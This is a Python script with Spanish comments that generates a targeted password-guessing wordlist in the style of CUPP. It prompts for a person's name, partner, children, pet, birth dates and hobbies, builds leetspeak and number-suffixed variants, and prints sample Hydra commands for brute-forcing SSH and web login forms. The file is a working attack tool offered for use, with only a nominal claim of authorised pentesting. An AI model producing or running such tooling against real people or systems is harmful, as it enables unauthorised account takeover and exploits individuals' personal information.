#!/usr/bin/env python3
"""
Generador de diccionarios de fuerza bruta (estilo CUPP)
---------------------------------------------------------
Uso educativo / pentesting autorizado. Genera un archivo .txt
con posibles contraseñas basadas en datos personales de un
objetivo (para usar luego con Hydra, John, Hashcat, etc.)

Uso:
    python3 dict_generator.py
"""

import itertools
import re
from datetime import datetime

# ---------------------------------------------------------
# Utilidades
# ---------------------------------------------------------

def limpiar(texto: str) -> str:
    """Quita espacios y caracteres raros, deja solo alfanumérico."""
    return re.sub(r'[^a-zA-Z0-9ñÑ]', '', texto.strip())


def leet(palabra: str) -> str:
    """Convierte una palabra a leetspeak básico."""
    reemplazos = {
        'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'
    }
    resultado = palabra.lower()
    for letra, num in reemplazos.items():
        resultado = resultado.replace(letra, num)
    return resultado


def preguntar(mensaje: str, obligatorio: bool = False) -> str:
    while True:
        valor = input(mensaje).strip()
        if valor or not obligatorio:
            return valor
        print("Este dato es obligatorio, intenta de nuevo.")


# ---------------------------------------------------------
# Recolección de datos
# ---------------------------------------------------------

def recolectar_datos() -> dict:
    print("=== Generador de diccionario (estilo CUPP) ===")
    print("Completá los datos que conozcas de la persona objetivo.")
    print("Podés dejar en blanco lo que no sepas.\n")

    datos = {}
    datos['nombre'] = preguntar("Nombre: ")
    datos['apellido'] = preguntar("Apellido: ")
    datos['apodo'] = preguntar("Apodo / nickname: ")
    datos['fecha_nac'] = preguntar("Fecha de nacimiento (DDMMAAAA): ")
    datos['pareja'] = preguntar("Nombre de la pareja: ")
    datos['fecha_pareja'] = preguntar("Fecha de nacimiento de la pareja (DDMMAAAA): ")
    datos['hijo'] = preguntar("Nombre de hijo/a: ")
    datos['mascota'] = preguntar("Nombre de mascota: ")
    datos['equipo'] = preguntar("Equipo de fútbol / hobby favorito: ")
    datos['palabra_clave'] = preguntar("Palabra especial (ciudad, banda, etc.): ")
    datos['numeros_extra'] = preguntar("Números especiales (ej: 123, 007) separados por coma: ")

    return datos


# ---------------------------------------------------------
# Generación de combinaciones
# ---------------------------------------------------------

def extraer_anios(fecha: str) -> list:
    """De una fecha DDMMAAAA extrae variantes de año."""
    anios = []
    if len(fecha) == 8 and fecha.isdigit():
        anio_completo = fecha[4:]
        anio_corto = anio_completo[2:]
        anios.extend([anio_completo, anio_corto])
    return anios


def generar_diccionario(datos: dict) -> set:
    palabras_base = set()
    numeros = {'', '1', '12', '123', '1234', '01', '007', '99', '2024', '2025'}

    # Palabras base (nombres propios y demás)
    campos_texto = ['nombre', 'apellido', 'apodo', 'pareja',
                     'hijo', 'mascota', 'equipo', 'palabra_clave']

    for campo in campos_texto:
        valor = limpiar(datos.get(campo, ''))
        if valor:
            palabras_base.add(valor.lower())
            palabras_base.add(valor.capitalize())
            palabras_base.add(valor.upper())
            palabras_base.add(leet(valor))

    # Combinación nombre + apellido
    nombre = limpiar(datos.get('nombre', ''))
    apellido = limpiar(datos.get('apellido', ''))
    if nombre and apellido:
        palabras_base.add((nombre + apellido).lower())
        palabras_base.add((nombre[0] + apellido).lower())

    # Años extraídos de fechas
    for campo_fecha in ['fecha_nac', 'fecha_pareja']:
        for anio in extraer_anios(datos.get(campo_fecha, '')):
            numeros.add(anio)

    # Números especiales ingresados manualmente
    extras = datos.get('numeros_extra', '')
    if extras:
        for n in extras.split(','):
            n = n.strip()
            if n:
                numeros.add(n)

    # Combinar palabras base + números + símbolos comunes
    simbolos = ['', '!', '#', '@', '.']
    resultado = set()

    for palabra in palabras_base:
        for numero in numeros:
            for simbolo in simbolos:
                resultado.add(f"{palabra}{numero}{simbolo}")
                resultado.add(f"{palabra}{simbolo}{numero}")

    # También agregar solo las palabras base y solo los números
    resultado.update(palabras_base)
    resultado.update(n for n in numeros if n)

    return resultado


# ---------------------------------------------------------
# Guardado
# ---------------------------------------------------------

def guardar_diccionario(palabras: set, nombre_archivo: str = "diccionario.txt"):
    palabras_ordenadas = sorted(palabras, key=len)
    with open(nombre_archivo, 'w', encoding='utf-8') as f:
        for palabra in palabras_ordenadas:
            if palabra:  # evita líneas vacías
                f.write(palabra + '\n')
    print(f"\n[+] Diccionario generado: {nombre_archivo}")
    print(f"[+] Total de contraseñas candidatas: {len(palabras_ordenadas)}")


# ---------------------------------------------------------
# Main
# ---------------------------------------------------------

def main():
    datos = recolectar_datos()
    diccionario = generar_diccionario(datos)
    nombre_archivo = preguntar("\nNombre del archivo de salida (default: diccionario.txt): ") or "diccionario.txt"
    guardar_diccionario(diccionario, nombre_archivo)

    print("\n--- Ejemplo de uso con Hydra (solo en entornos autorizados) ---")
    print(f"hydra -l usuario -P {nombre_archivo} ssh://IP_OBJETIVO")
    print(f"hydra -l usuario -P {nombre_archivo} IP_OBJETIVO http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"")


if __name__ == "__main__":
    main()